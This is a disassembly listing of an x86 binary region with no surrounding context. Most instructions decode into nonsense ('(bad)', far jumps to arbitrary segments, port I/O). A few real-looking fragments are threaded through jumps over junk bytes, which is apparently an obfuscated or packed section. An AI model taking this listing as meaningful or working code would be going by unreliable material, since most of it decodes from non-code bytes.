  425508:	sbb    DWORD PTR [edi+0x1d],edi
  42550b:	inc    edi
  42550c:	dec    esi
  42550d:	mov    al,ds:0x47149823
  425512:	scas   al,BYTE PTR es:[edi]
  425513:	(bad)  
  425515:	cmp    edi,esi
  425517:	xor    eax,0x796548a9
  42551c:	sub    eax,0xb1f57dec
  425521:	aaa    
  425522:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  425524:	mov    ah,0x60
  425526:	cld    
  425527:	cmp    al,0xb
  425529:	paddusw mm0,mm3
  42552c:	pusha  
  42552d:	ss daa 
  42552f:	or     eax,0xca26ef30
  425534:	shr    DWORD PTR [ebx+0x32],1
  425537:	(bad)  
  425538:	push   0x9e279ef5
  42553d:	das    
  42553e:	iret   
  42553f:	xchg   esp,eax
  425540:	sbb    esp,DWORD PTR [ecx+0x44c3fd5b]
  425546:	push   ebx
  425547:	retf   
  425548:	xor    DWORD PTR ds:0x985596d,ebx
  42554e:	pop    esp
  42554f:	fxch   st(1)
  425551:	xor    eax,0xbdeab3fd
  425556:	cli    
  425557:	xor    esi,esp
  425559:	sbb    al,0xc3
  42555b:	jp     0x42556a
  42555d:	rcr    dl,1
  42555f:	mov    bl,0x33
  425561:	stos   BYTE PTR es:[edi],al
  425562:	inc    edi
  425563:	repz mov bl,0xcc
  425566:	or     BYTE PTR [esi],bh
  425568:	jb     0x425569
  42556a:	xchg   ebp,eax
  42556b:	inc    esp
  42556c:	scas   eax,DWORD PTR es:[edi]
  42556d:	sbb    dh,BYTE PTR [eax-0x1b]
  425570:	adc    eax,0x8b638b2b
  425575:	pop    ebp
  425576:	or     cl,ch
  425578:	rol    BYTE PTR [eax],0x0
  42557b:	add    BYTE PTR [ebx+0x479305d1],dl
  425581:	xlat   BYTE PTR ds:[ebx]
  425582:	xchg   edi,eax
  425583:	rcr    DWORD PTR [ecx+0x47e4d2b8],1
  425589:	mov    DWORD PTR [edi],ecx
  42558b:	jo     0x425559
  42558d:	mov    eax,0xa80001
  425592:	add    BYTE PTR [eax],al
  425594:	int3   
  425595:	call   0x23c7:0x775292df
  42559c:	pop    ecx
  42559d:	rcr    BYTE PTR [edx],0x8e
  4255a0:	inc    ebx
  4255a1:	adc    cl,dh
  4255a3:	xor    dl,dl
  4255a5:	adc    BYTE PTR [ecx],dh
  4255a7:	mov    ch,0xc3
  4255a9:	repz out dx,eax
  4255ab:	dec    esi
  4255ac:	xchg   esi,eax
  4255ad:	add    BYTE PTR [eax-0x726951f2],dh
  4255b3:	push   eax
  4255b4:	inc    BYTE PTR [edi]
  4255b6:	fbstp  TBYTE PTR [edx+ecx*8-0x50e4c0f7]
  4255bd:	jmp    0x425587
  4255bf:	jmp    0xb6850241
  4255c4:	xor    ecx,DWORD PTR [ebp+eax*1-0x6d65cfeb]
  4255cb:	or     BYTE PTR [ebp-0x914caba],bl
  4255d1:	xchg   dl,bh
  4255d3:	xor    BYTE PTR [esi+eiz*2+0x7f],ch
  4255d7:	pop    es
  4255d8:	retf   0x927e
  4255db:	cmp    eax,0x918f20e6
  4255e0:	mov    al,ds:0xecabe40b
  4255e5:	push   ds
  4255e6:	mov    WORD PTR [ebx-0x12],es
  4255e9:	pop    esp
  4255ea:	xchg   ebp,eax
  4255eb:	repz sbb eax,0x2da542df
  4255f1:	shl    ah,1
  4255f3:	mov    ds:0x497f4105,al
  4255f8:	xchg   ebx,eax
  4255f9:	pop    ebx
  4255fa:	pop    ebp
  4255fb:	ins    BYTE PTR es:[edi],dx
  4255fc:	loopne 0x42557e
  4255fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4255ff:	and    al,0xeb
  425601:	jp     0x425649
  425603:	cs jns 0x425644
  425606:	jns    0x425651
  425608:	or     BYTE PTR [ebx-0x6e],ch
  42560b:	js     0x4255ca
  42560d:	pop    edi
  42560e:	lods   eax,DWORD PTR ds:[esi]
  42560f:	lock pop ebx
  425611:	jne    0x4255ea
  425613:	mov    bl,BYTE PTR [edi]
  425615:	mov    BYTE PTR [ebx-0x6fb998cc],bh
  42561b:	cwde   
  42561c:	cmc    
  42561d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42561e:	inc    edx
  42561f:	jb     0x4255cb
  425621:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425622:	jns    0x4255d6
  425624:	fimul  DWORD PTR [ebp+0x2e]
  425627:	imul   ecx,DWORD PTR [esi+0x6b],0xaab678e
  42562e:	and    bh,BYTE PTR [edx+0x38]
  425631:	fsub   DWORD PTR [eax+ecx*2+0x4c]
  425635:	retf   0x4a10
  425638:	cmp    BYTE PTR [ebp+edi*2-0x966f30a],ah
  42563f:	jmp    0xe906:0x4e0558b
  425646:	rol    BYTE PTR [eax],0x0
  425649:	add    BYTE PTR [esi-0x6250f6c6],ch
  42564f:	mov    edi,0x89973bae
  425654:	stc    
  425655:	lahf   
  425656:	(bad)  
  425657:	(bad)  
  425658:	fstp   TBYTE PTR [edi]
  42565a:	je     0x425615
  42565c:	add    DWORD PTR [eax],eax
  42565e:	test   al,0x0
  425660:	add    BYTE PTR [eax],al
  425662:	cwde   
  425663:	cs dec eax
  425665:	test   eax,0x9950488f
  42566a:	retf   0x6f00
  42566d:	adc    BYTE PTR [edi-0x57],ch
  425670:	int3   
  425671:	aas    
  425672:	pop    ss
  425673:	ror    DWORD PTR [eax+edx*4-0x4ccf59a3],0x1a
  42567b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42567c:	out    dx,al
  42567d:	repnz mov ebp,0xd28003d
  425683:	ret    
  425684:	int    0xae
  425686:	mov    ch,0xa
  425688:	add    al,0x23
  42568a:	xchg   DWORD PTR [ebx],edx
  42568c:	pop    ss
  42568d:	adc    BYTE PTR [edx-0x3f],ah
  425690:	push   ecx
  425691:	popa   
  425692:	mov    dh,0x65
  425694:	pop    ebp
  425695:	dec    esp
  425696:	xor    eax,0x61335dd3
  42569b:	loopne 0x42568a
  42569d:	adc    eax,0xb7861511
  4256a2:	xchg   ebp,eax
  4256a3:	in     eax,0x23
  4256a5:	mov    DWORD PTR [eax],ecx
  4256a7:	mov    bh,ch
  4256a9:	xor    bl,BYTE PTR [ebp+0x14]
  4256ac:	cs call 0x6eaa:0x9b389b59
  4256b4:	mov    ds:0x982b4a78,eax
  4256b9:	call   0x1e09a71e
  4256be:	lods   al,BYTE PTR ds:[esi]
  4256bf:	inc    edx
  4256c0:	xchg   ecx,eax
  4256c1:	sbb    DWORD PTR [esi+0x787c2798],ebp
  4256c7:	sbb    DWORD PTR [ebx],ebx
  4256c9:	ror    DWORD PTR [edx+0x670d424f],cl
  4256cf:	repz push edi
  4256d1:	(bad)  
  4256d2:	call   0xf7cd0665
  4256d7:	dec    ecx
  4256d8:	fld    TBYTE PTR [edi]
  4256da:	sti    
  4256db:	add    eax,0x61f30607
  4256e0:	fwait
  4256e1:	cmp    DWORD PTR [ebx+eax*4-0x14],edi
  4256e5:	stos   BYTE PTR es:[edi],al
  4256e6:	sbb    ebp,DWORD PTR [eax]
  4256e8:	push   0x6c
  4256ea:	popf   
  4256eb:	xchg   esp,eax
  4256ec:	adc    ch,BYTE PTR [esp+edi*2+0x1c369702]
  4256f3:	jb     0x4256df
  4256f5:	or     dh,BYTE PTR [edx+ecx*4-0x40f93b4f]
  4256fc:	lods   eax,DWORD PTR ds:[esi]
  4256fd:	and    ebx,DWORD PTR [edx+0x54]
  425700:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425701:	jb     0x425713
  425703:	jl     0x42570f
  425705:	push   ds
  425706:	push   ebx
  425707:	xchg   edi,eax
  425708:	add    eax,0x20c34a2
  42570d:	inc    ebp
  42570e:	or     al,0x88
  425710:	add    al,0x1a
  425712:	mov    ebx,DWORD PTR [ebp-0x30]
  425715:	mov    eax,DWORD PTR [ebp-0x34]
  425718:	jmp    0x4257dd
  42571d:	mov    al,0x6a
  42571f:	xchg   edi,eax
  425720:	add    edi,ebx
  425722:	std    
  425723:	mov    dh,0xfb
  425725:	stos   BYTE PTR es:[edi],al
  425726:	xchg   edx,eax
  425727:	xchg   ebx,eax
  425728:	sbb    al,0x43
  42572a:	sbb    dh,BYTE PTR ds:0x1ba1cc7
  425730:	add    BYTE PTR [eax+0x61000000],ch
  425736:	cmc    
  425737:	sbb    DWORD PTR [eax-0x24579ba9],ecx
  42573d:	icebp  
  42573e:	arpl   sp,sp
  425740:	je     0x4257b4
  425742:	xchg   edx,eax
  425743:	sahf   
  425744:	arpl   WORD PTR [ebx],si
  425746:	inc    edi
  425747:	jmp    0x90ceb34c
  42574c:	cmp    dh,ah
  42574e:	shr    ebx,0xb
  425751:	and    al,0x3e
  425753:	adc    eax,0xe8a2931b
  425758:	rol    DWORD PTR [edx-0x3a4af181],1
  42575e:	xchg   edi,eax
  42575f:	sub    BYTE PTR [ecx],al
  425761:	pop    es
  425762:	gs dec eax
  425764:	push   ss
  425765:	call   0xabdb:0x6a0a86c5
  42576c:	sbb    edi,DWORD PTR [ebp-0x403ed2b9]
  425772:	sbb    edi,esi
  425774:	cmp    eax,0x2cd04624
  425779:	les    esp,FWORD PTR [ecx+eiz*4+0x5298b3c6]
  425780:	mov    esp,0x58a50db7
  425785:	pop    ebx
  425786:	dec    esp
  425787:	enter  0x6c7,0xe6
  42578b:	mul    DWORD PTR [ebp-0x69]
  42578e:	enter  0x114a,0xd5
  425792:	(bad)  
  425793:	adc    dl,BYTE PTR [edx]
  425795:	fs ja  0x425725
  425798:	pop    ds
  425799:	aas    
  42579a:	push   es
  42579b:	xchg   ebp,eax
  42579c:	mov    ebp,0xf892efdb
  4257a1:	pop    ds
  4257a2:	aaa    
  4257a3:	adc    BYTE PTR [ebx+0x5a],0xbd
  4257a7:	sub    al,0x68
  4257a9:	push   cs
  4257aa:	push   cs
  4257ab:	sbb    DWORD PTR [ebx+0x18eaba93],esp
  4257b1:	mov    WORD PTR [ecx+0x48],gs
  4257b4:	sub    BYTE PTR [edx-0xf58bc81],0x99
  4257bb:	in     al,0xb9
  4257bd:	add    BYTE PTR [ebx+0x594cd309],bh
  4257c3:	fbstp  TBYTE PTR [ebx+0x33]
  4257c6:	mov    bh,0x4c
  4257c8:	shl    BYTE PTR [edi+0x79dc18d1],1
  4257ce:	hlt    
  4257cf:	inc    esi
  4257d0:	retf   0x990e
  4257d3:	push   ebp
  4257d4:	loop   0x425790
  4257d6:	inc    esi
  4257d7:	pop    edx
  4257d8:	mov    DWORD PTR [edi],ecx
  4257da:	scas   eax,DWORD PTR es:[edi]
  4257db:	popf   
  4257dc:	xor    dh,BYTE PTR [ebx]
  4257de:	shl    bh,cl
  4257e0:	repz mov edx,DWORD PTR [ebp-0x38]
  4257e4:	jmp    0x4258a9
  4257e9:	sub    edx,ebp
  4257eb:	mov    cl,0x97
  4257ed:	push   edi
  4257ef:	das    
  4257f0:	std    
  4257f1:	ins    BYTE PTR es:[edi],dx
  4257f2:	ret    
  4257f3:	div    BYTE PTR [ebx]
  4257f5:	shl    BYTE PTR [ebp-0x453b1b79],cl
  4257fb:	add    DWORD PTR [eax],eax
  4257fd:	test   al,0x0
  4257ff:	add    BYTE PTR [eax],al
  425801:	inc    eax
  425802:	test   eax,0x800545fc
  425807:	dec    esi
  425808:	add    edi,DWORD PTR cs:[eax-0x2f]
  42580c:	jns    0x425859
  42580e:	sbb    eax,0x2675360b
  425813:	call   0xb32c0ebf
  425818:	fs dec esp
  42581a:	mov    bh,0x28
  42581c:	push   es
  42581d:	or     cl,BYTE PTR [ebx-0x14]
  425820:	aaa    
  425821:	pop    es
  425822:	call   DWORD PTR [esi+edi*1]
  425825:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425826:	nop
  425827:	mov    bl,0xfe
  425829:	sub    ebx,eax
  42582b:	shl    DWORD PTR [eax+0x39af3be6],cl
  425831:	mov    bl,0x47
  425833:	or     BYTE PTR [ecx],bl
  425835:	and    dl,BYTE PTR gs:[edx+0x6b556a84]
  42583c:	iret   
  42583d:	dec    ebp
  42583e:	mov    cl,0x1b
  425840:	mov    DWORD PTR [edx],ebx
  425842:	stos   BYTE PTR es:[edi],al
  425843:	xor    eax,0x9f250023
  425848:	das    
  425849:	mov    al,0x60
  42584b:	cmp    dh,BYTE PTR [eax]
  42584d:	mov    dh,BYTE PTR [esi-0xd45f4b8]
  425853:	rcl    DWORD PTR [esi-0x67ebad76],0xf0
  42585a:	mov    dh,0x18
  42585c:	jb     0x425827
  42585e:	or     bh,BYTE PTR [eax]
  425860:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425861:	(bad)  
  425862:	mov    edx,0xf20c767b
  425867:	pushf  
  425868:	mov    ds:0x79b7d4d3,eax
  42586d:	pop    edi
  42586e:	jns    0x425826
  425870:	loope  0x42583a
  425872:	xor    DWORD PTR [edi-0x7e],0xffffffa7
  425876:	dec    ebx
  425877:	adc    cl,BYTE PTR [eax+0x79ea6aef]
  42587d:	int    0x3a
  42587f:	jae    0x4258e7
  425881:	xlat   BYTE PTR ds:[ebx]
  425882:	add    ebx,ecx
  425884:	add    DWORD PTR ss:[ecx-0x682d8df6],eax
  42588b:	mov    eax,0xb8368b22
  425890:	adc    eax,0x79591864
  425895:	cmp    BYTE PTR ds:[ebp-0x6],ah
  425899:	lock add BYTE PTR [ebx],bh
  42589c:	mov    cl,0xaf
  42589e:	pushf  
  42589f:	rcl    DWORD PTR [esi+edi*2+0x7d],0xc
  4258a4:	test   DWORD PTR [ecx],ebx
  4258a6:	inc    esi
  4258a7:	rcr    BYTE PTR [esi],0x35
  4258aa:	jmp    0x2342590d
  4258af:	ret    0x1135
  4258b2:	adc    BYTE PTR [eax],al
  4258b4:	add    BYTE PTR [ebx],al
  4258b6:	enter  0x458b,0xfc
  4258ba:	mov    edx,DWORD PTR [ebp-0x8]
  4258bd:	imul   eax,eax,0x398b
  4258c3:	mov    ebx,DWORD PTR [ebp-0xc]
  4258c6:	sub    eax,edx
  4258c8:	add    eax,0x721e
  4258cd:	xor    edx,edx
  4258cf:	div    ebx
  4258d1:	mov    edx,0x5a11
  4258d6:	jmp    0x42599b
  4258db:	mov    al,0x10
  4258dd:	fcom   QWORD PTR [ebx+0x33ffdffc]
  4258e3:	or     dl,0xc3
  4258e6:	lahf   
  4258e7:	inc    ecx
  4258e8:	sub    edx,DWORD PTR [ecx+0x1bb6c4e]
  4258ee:	add    BYTE PTR [eax-0x2c000000],ch
  4258f4:	or     dh,ah
  4258f6:	jle    0x4258b6
  4258f8:	(bad)  
  4258f9:	lods   al,BYTE PTR ds:[esi]
  4258fa:	sbb    bl,dl
  4258fc:	imul   edi,esi,0x32
  4258ff:	not    edx
  425901:	out    dx,al
  425902:	cmp    eax,0x4628405f
  425907:	sbb    dh,bh
  425909:	xchg   edi,eax
  42590a:	add    eax,0x6ac6f799
  42590f:	cmp    ebx,esi
  425911:	inc    eax
  425912:	es push 0xffffffd6
  425915:	and    al,0x17
  425917:	xchg   edx,eax
  425918:	stos   BYTE PTR es:[edi],al
  425919:	dec    eax
  42591a:	out    0xf6,al
  42591c:	dec    esi
  42591d:	pcmpgtb mm1,QWORD PTR [ebx]
  425920:	pop    eax
  425921:	les    esp,FWORD PTR [ebx-0x71]
  425924:	pop    ds
  425925:	xchg   esi,eax
  425926:	sbb    eax,0x6e9662a5
  42592b:	stc    
  42592c:	sub    ah,BYTE PTR [edi]
  42592e:	mov    WORD PTR [esi],?
  425930:	inc    ecx
  425931:	add    eax,0x6f25f5e6
  425936:	ror    ch,1
  425938:	mov    dl,0x3f
  42593a:	aas    
  42593b:	test   al,0xbc
  42593d:	out    0x64,al
  42593f:	or     al,0xe5
  425941:	or     BYTE PTR [eax+0x51],bl
  425944:	push   esi
  425945:	cmp    DWORD PTR [edi+0x7ea3ee35],edx
  42594b:	hlt    
  42594c:	dec    ebp
  42594d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42594e:	rcr    ecx,1
  425950:	shr    DWORD PTR [edi+0x6c5f9d9],1
  425956:	mov    eax,ds:0x6acb96c2
  42595b:	aad    0x99
  42595d:	je     0x42591c
  42595f:	xor    al,0x8a
  425961:	aaa    
  425962:	mov    bh,BYTE PTR [edx-0x7a]
  425965:	pop    ds
  425966:	call   0x6003135c
  42596b:	push   ss
  42596c:	xchg   esi,eax
  42596d:	mov    bl,0x7d
  42596f:	dec    edx
  425970:	mov    edi,DWORD PTR [eax]
  425972:	cmp    al,0xa2
  425974:	push   edx
  425975:	or     al,0xef
  425977:	mov    fs,WORD PTR [ecx-0xc04353e]
  42597d:	stos   DWORD PTR es:[edi],eax
  42597e:	shr    BYTE PTR [edi],0xcb
  425981:	(bad)  
  425982:	jmp    0x4259c2
  425984:	stc    
  425985:	sbb    al,0xe7
  425987:	fist   DWORD PTR [edx+ebx*4-0x3ddb15af]
  42598e:	add    DWORD PTR [edi-0x2],ecx
  425991:	inc    eax
  425992:	xor    BYTE PTR [ebx+0x7],cl
  425995:	ins    DWORD PTR es:[edi],dx
  425996:	pop    edx
  425997:	ret    
  425998:	pop    edx
  425999:	mov    edi,0x8bd02b79
  42599e:	inc    ebp
  42599f:	lock mov ebx,DWORD PTR [ebp-0x14]
  4259a3:	jmp    0x425a68
  4259a8:	retf   0x79b4
  4259ab:	dec    edi
  4259ac:	jg     0x42597d
  4259ae:	(bad)  
  4259af:	mov    ch,0x34
  4259b1:	dec    ebp
  4259b2:	pop    esp
  4259b3:	adc    edx,edi
  4259b5:	loope  0x4259f6
  4259b7:	(bad)  
  4259b8:	adc    al,0xbc
  4259ba:	add    DWORD PTR [eax],eax
  4259bc:	test   al,0x0
  4259be:	add    BYTE PTR [eax],al
  4259c0:	jmp    0xb891:0x161b1686
  4259c7:	imul   ecx,DWORD PTR [eax-0x3b7ce956],0xffffffb8
  4259ce:	pop    edi
  4259cf:	scas   eax,DWORD PTR es:[edi]
  4259d0:	inc    edx
  4259d1:	push   ebx
  4259d2:	xor    al,0x8c
  4259d4:	dec    eax
  4259d5:	lds    ecx,FWORD PTR [edx]
  4259d7:	sbb    bl,ah
  4259d9:	out    dx,eax
  4259da:	cmc    
  4259db:	adc    bh,BYTE PTR [edx]
  4259dd:	xor    DWORD PTR [ecx+edi*8],edi
  4259e0:	adc    DWORD PTR [eax+edi*2],ebx
  4259e3:	cmp    DWORD PTR [edi-0x1f04c6e],eax
  4259e9:	jmp    0x586735dc
  4259ee:	int    0x5a
  4259f0:	xor    edi,edi
  4259f2:	popf   
  4259f3:	icebp  
  4259f4:	fist   DWORD PTR [eax+ecx*8]
  4259f7:	mov    BYTE PTR ds:0xd2a7187a,bh
  4259fd:	cmp    DWORD PTR [edi-0x14],esi
  425a00:	xor    al,0xc5
  425a02:	sub    DWORD PTR [ebx+0x7e],0xffffff97
  425a06:	adc    eax,0x45ada36a
  425a0b:	xchg   esp,eax
  425a0c:	out    0x38,eax
  425a0e:	call   0x60f7:0xa755b934
  425a15:	imul   edx,DWORD PTR [edx-0x24ad75a3],0x3a983235
  425a1f:	mov    edx,0x2cbfe3fa
  425a24:	cmp    ah,dl
  425a26:	pop    ds
  425a27:	mov    eax,0xa1031241
  425a2c:	inc    esp
  425a2d:	or     ebx,DWORD PTR [ecx]
  425a2f:	add    cl,ch
  425a31:	ja     0x425a43
  425a33:	mov    ds:0x5ea273c7,al
  425a38:	ret    0x38b1
  425a3b:	jmp    0xf742:0x6b61bbb1
  425a42:	(bad)  
  425a43:	ror    BYTE PTR [ebx-0x3f9e2972],1
  425a49:	push   ecx
  425a4a:	lods   eax,DWORD PTR ds:[esi]
  425a4b:	loop   0x425a06
  425a4d:	ror    BYTE PTR [ebx+0x1bdb38de],cl
  425a53:	or     ah,BYTE PTR [esp+edx*4-0x78969bc]
  425a5a:	lahf   
  425a5b:	push   ds
  425a5c:	push   0x540619c9
  425a61:	outs   dx,BYTE PTR ds:[esi]
  425a62:	mov    WORD PTR [eax],ss
  425a64:	jmp    0x6090:0xda35a56
  425a6b:	add    BYTE PTR [eax],al
  425a6d:	jmp    0x425b32
  425a72:	dec    ebx
  425a73:	push   esi
  425a74:	ror    ebx,cl
  425a76:	(bad)  
  425a78:	pop    ebx
  425a79:	(bad)  
  425a7a:	jnp    0x425ac4
  425a7c:	cmp    ebp,ecx
  425a7e:	inc    esi
  425a7f:	or     BYTE PTR [edx+0x33],bh
  425a82:	mov    esp,0xa80001bc
  425a87:	add    BYTE PTR [eax],al
  425a89:	add    BYTE PTR [edi+ebx*1+0xb6cd6e6],cl
  425a90:	push   0xd923e6c1
  425a95:	add    esi,0xa12e4493
  425a9b:	push   cs
  425a9c:	test   DWORD PTR [ebx+0x5493086],ebx
  425aa2:	jnp    0x425b00
  425aa4:	mov    ds:0xdb49981f,eax
  425aa9:	jno    0x425a95
  425aab:	fistp  QWORD PTR [ecx+esi*8]
  425aae:	ret    0x19c0
  425ab1:	loopne 0x425a6d
  425ab3:	call   0x99b0:0x951e9255
  425aba:	das    
  425abb:	bound  edx,QWORD PTR [edx+0x7c]
  425abe:	popa   
  425abf:	jne    0x425b1b
  425ac1:	rcl    DWORD PTR [edi+0x7aa55fda],1
  425ac7:	push   ss
  425ac8:	push   ebx
  425ac9:	imul   edx,DWORD PTR [esi-0x23],0xd60d3299
  425ad0:	test   eax,0x20e9467e
  425ad5:	dec    edx
  425ad6:	icebp  
  425ad7:	into   
  425ad8:	ss push edi
  425ada:	mov    edx,0xf1ffb372
  425adf:	ins    BYTE PTR es:[edi],dx
  425ae0:	loopne 0x425a83
  425ae2:	adc    al,0xbf
  425ae4:	fs jne 0x425b15
  425ae7:	xlat   BYTE PTR ds:[ebx]
  425ae8:	rol    BYTE PTR [edx-0x4b9a5a86],cl
  425aee:	fidivr WORD PTR [esi-0x596a98ef]
  425af4:	loopne 0x425ac7
  425af6:	gs push esp
  425af8:	or     BYTE PTR [eax],dl
  425afa:	mov    edx,0x953d70d2
  425aff:	hlt    
  425b00:	cmp    eax,ecx
  425b02:	adc    DWORD PTR [ecx+0x735971b7],eax
  425b08:	sbb    eax,0x1d6c9b1e
  425b0d:	adc    eax,0x6cf551ea
  425b12:	fcom   DWORD PTR [edx]
  425b14:	mov    WORD PTR [ecx],cs
  425b16:	inc    esi
  425b17:	call   0x31b2c11
  425b1c:	push   0xf95f1662
  425b21:	inc    ebp
  425b22:	stos   DWORD PTR es:[edi],eax
  425b23:	pusha  
  425b24:	adc    esi,ecx
  425b26:	mov    WORD PTR [edi+eiz*4+0x2fdc7f3],fs
  425b2d:	je     0x425ae7
  425b2f:	add    eax,0xc3338cb1
  425b34:	or     eax,edi
  425b36:	mov    ebx,ecx
  425b38:	sub    ebx,eax
  425b3a:	add    ebx,esi
  425b3c:	cmp    ebx,edx
  425b3e:	jbe    0x425154
  425b44:	jmp    0x425c09
  425b49:	shr    DWORD PTR [edi-0x23],cl
  425b4c:	sbb    eax,0xefd3bffd
  425b51:	ins    DWORD PTR es:[edi],dx
  425b52:	xchg   edx,eax
  425b53:	xchg   esi,eax
  425b54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b55:	cmp    al,bl
  425b57:	popf   
  425b58:	xchg   edx,eax
  425b59:	fs mov ebp,0xa80001
  425b5f:	add    BYTE PTR [eax],al
  425b61:	jae    0x425b28
  425b63:	(bad)  
  425b65:	call   0xd1a7:0xa33fa67b
  425b6c:	ss into 
  425b6e:	mov    bl,0x61
  425b70:	ffree  st(5)
  425b72:	shr    DWORD PTR [ebp-0x61],0x9e
  425b76:	ret    0x7d89
  425b79:	ror    DWORD PTR [eiz*4-0xd95adf4],cl
  425b80:	call   0x70b6:0x64868400
  425b87:	mov    BYTE PTR [ecx+0x2af3c389],al
  425b8d:	jns    0x425b2f
  425b8f:	in     al,0x3d
  425b91:	xor    DWORD PTR [eax],0x28
  425b94:	shl    ch,cl
  425b96:	mov    ah,0x75
  425b98:	cmp    BYTE PTR [esi+esi*8],dh
  425b9b:	mov    bh,0xc7
  425b9d:	mov    ds:0x47d5ed8b,eax
  425ba2:	mov    ch,0x93
  425ba4:	inc    ecx
  425ba5:	mov    ecx,0x358eb691
  425baa:	mov    ?,WORD PTR [ebp+0x6f]
  425bad:	daa    
  425bae:	scas   al,BYTE PTR es:[edi]
  425baf:	jbe    0x425c1d
  425bb1:	sub    al,0x1
  425bb3:	pop    es
  425bb4:	mov    dl,0x20
  425bb6:	inc    esi
  425bb7:	ror    DWORD PTR [ebx],cl
  425bb9:	mov    ds:0xf8115005,al
  425bbe:	mov    BYTE PTR [ecx-0x59],bh
  425bc1:	xor    BYTE PTR [ebx],dh
  425bc3:	push   esp
  425bc4:	inc    ecx
  425bc5:	dec    esi
  425bc6:	and    BYTE PTR [edx+0x7515bc72],bh
  425bcc:	or     eax,0x46dbc174
  425bd1:	(bad)  
  425bd2:	cmp    al,0x5
  425bd4:	jg     0x425bfa
  425bd6:	push   esi
  425bd7:	mov    al,0xa6
  425bd9:	test   DWORD PTR [esi],edx
  425bdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425bdc:	mov    WORD PTR [ecx],ss
  425bde:	mov    eax,ds:0xbadac6e7
  425be3:	call   0x4348d66f
  425be8:	pop    ebp
  425be9:	push   edx
  425bea:	rol    DWORD PTR [edi+0x30],1
  425bed:	mov    ebp,cs
  425bef:	jo     0x425c52
  425bf1:	dec    edi
  425bf2:	shl    ebx,cl
  425bf4:	mov    DWORD PTR [edi-0x53b2d756],esi
  425bfa:	out    0xe3,al
  425bfc:	mov    ecx,0xac6405d7
  425c01:	xor    al,BYTE PTR [eax+0x6c]
  425c04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c05:	jbe    0x425c00
  425c07:	sbb    DWORD PTR [edi+0x5f],edx
  425c0a:	jmp    0x425ccf
  425c0f:	aad    0x31
  425c11:	mov    dl,0x1f
  425c13:	neg    BYTE PTR [edi-0x78250403]
  425c19:	ror    ch,cl
  425c1b:	inc    ecx
  425c1c:	add    DWORD PTR [edi+0x1be0c70],0xa800
  425c26:	add    BYTE PTR [edi+0x4b],bl
  425c29:	push   ds
  425c2a:	mov    bh,0xc3
  425c2c:	xchg   ebx,eax
  425c2d:	hlt    
  425c2e:	mov    edi,0x8cfabe20
  425c33:	mov    DWORD PTR [ebx],0x5a776f17
  425c39:	outs   dx,BYTE PTR ds:[esi]
  425c3a:	cdq    
  425c3b:	std    
  425c3c:	mov    ecx,0x8213c085
  425c41:	out    dx,al
  425c42:	(bad)  
  425c43:	(bad)  
  425c44:	mov    bh,dl
  425c46:	(bad)  
  425c47:	bound  ecx,QWORD PTR [eax]
  425c49:	int3   
  425c4a:	sbb    al,0x10
  425c4c:	or     DWORD PTR [edi-0x4bafbd3e],0x60
  425c53:	cmc    
  425c54:	mov    ebp,0x6c1938d6
  425c59:	add    al,0x26
  425c5b:	sub    al,0xe8
  425c5d:	test   DWORD PTR ds:[ecx-0x60d4477c],esi
  425c64:	adc    BYTE PTR [esi+0x25729f91],ch
  425c6a:	and    bl,bl
  425c6c:	cs mov cl,0x8b
  425c6f:	cmp    ch,dl
  425c71:	pop    ecx
  425c72:	jecxz  0x425c9f
  425c74:	enter  0x1048,0xf0
  425c78:	pop    esp
  425c79:	pop    ss
  425c7a:	shr    BYTE PTR ds:0xaad98711,cl
  425c80:	lods   eax,DWORD PTR ds:[esi]
  425c81:	std    
  425c82:	in     eax,dx
  425c83:	xchg   esi,eax
  425c84:	xor    BYTE PTR [edi-0x17ddf702],dh
  425c8a:	mov    cl,0x66
  425c8c:	push   esi
  425c8d:	test   BYTE PTR [edi+ebx*1],bl
  425c90:	dec    esp
  425c91:	mov    esp,0x9a6bdc22
  425c96:	es xor al,0x38
  425c99:	lods   al,BYTE PTR ds:[esi]
  425c9a:	loop   0x425c27
  425c9c:	pop    esp
  425c9d:	ins    DWORD PTR es:[edi],dx
  425c9e:	pop    ds
  425c9f:	sub    BYTE PTR [ebp+edi*4-0x72a9b3eb],ch
  425ca6:	and    DWORD PTR [eax+0x25],esp
  425ca9:	nop
  425caa:	bound  edx,QWORD PTR [ebx-0x65b5e6b3]
  425cb0:	xchg   DWORD PTR [edi+0x4],ebp
  425cb3:	daa    
  425cb4:	push   edi
  425cb5:	leave  
  425cb6:	sub    al,0xa1
  425cb8:	xchg   ebp,eax
  425cb9:	icebp  
  425cba:	arpl   WORD PTR [ebp-0x11],bp
  425cbd:	and    eax,0xb83f56bb
  425cc2:	sbb    BYTE PTR [ebx],0x18
  425cc5:	inc    ebp
  425cc6:	lahf   
  425cc7:	adc    bl,ah
  425cc9:	jmp    0x425d30
  425ccb:	push   edx
  425ccc:	push   es
  425ccd:	jl     0x425c7f
  425ccf:	pop    esi
  425cd0:	pop    ebx
  425cd1:	leave  
  425cd2:	ret    0x8
  425cd5:	push   ebp
  425cd6:	mov    ebp,esp
  425cd8:	jmp    0x425db8
  425cdd:	stc    
  425cde:	lods   al,BYTE PTR ds:[esi]
  425cdf:	call   0xffa95a0a
  425ce4:	jmp    DWORD PTR [eax]
  425ce6:	mov    dh,BYTE PTR [edx]
  425ce8:	xor    eax,edx
  425cea:	jb     0x425ca7
  425cec:	mov    ?,WORD PTR [esi+edi*4+0xc30001]
  425cf3:	add    BYTE PTR [eax],al
  425cf5:	add    bh,al
  425cf7:	pusha  
  425cf8:	dec    ecx
  425cf9:	(bad)  
  425cfa:	fst    DWORD PTR [edx+0x25]
  425cfd:	adc    bh,BYTE PTR [edx+0x2d0ad4e]
  425d03:	(bad)  
  425d04:	dec    esi
  425d05:	sti    
  425d06:	mov    bh,0x92
  425d08:	dec    edi
  425d09:	fild   QWORD PTR [eax-0x1ee14227]
  425d0f:	fistp  QWORD PTR [eax+0x2d85678]
